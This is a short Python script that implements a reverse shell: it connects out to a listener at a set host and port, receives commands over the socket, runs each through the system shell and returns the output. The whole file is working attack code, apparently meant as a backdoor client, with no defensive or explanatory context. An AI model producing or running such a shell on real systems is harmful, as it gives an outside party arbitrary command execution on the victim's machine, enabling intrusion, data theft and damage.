import socket
import subprocess

HOST='0.0.0.0'
PORT=8888

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((HOST,PORT))
try:
    while True:
        cmd = s.recv(1024).decode()
        if not cmd:
            break
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        if not output:
            output='executed successfully'
        s.sendall(output.encode())
        
except:
    s.close()